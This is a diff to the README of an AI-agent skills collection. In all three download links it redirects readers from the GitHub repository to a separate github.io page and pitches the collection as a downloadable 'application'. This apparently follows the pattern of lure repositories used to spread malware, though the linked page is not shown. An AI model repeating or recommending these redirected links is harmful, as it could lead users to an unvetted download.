@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-agent-skills - Your Smart Assistant's Superpower Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-blue?style=for-the-badge&logo=github)](https://github.com/pepesaurio559/awesome-ai-agent-skills)
+[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-blue?style=for-the-badge&logo=github)](https://pepesaurio559.github.io)
 
 ## 🎯 What Is This?
 
@@ -18,7 +18,7 @@ This is a carefully organized collection of **718 ready-to-use skills** for GenP
 
 ## 📥 Download and Installation
 
-[**Visit this link to download the application**](https://github.com/pepesaurio559/awesome-ai-agent-skills)
+[**Visit this link to download the application**](https://pepesaurio559.github.io)
 
 The download is completely free and takes just a few minutes. Here's what to do:
 
@@ -171,7 +171,7 @@ You're now equipped with everything you need to get started with **awesome-ai-ag
 
 Remember: every expert was once a beginner. Start with simple skills, explore at your own pace, and soon you'll be amazed at what you can accomplish with your AI-powered workflow.
 
-**Don't wait—[download now](https://github.com/pepesaurio559/awesome-ai-agent-skills) and unlock the full potential of your AI agent today!**
+**Don't wait—[download now](https://pepesaurio559.github.io) and unlock the full potential of your AI agent today!**
 
 Happy automating! 🚀🤖
 
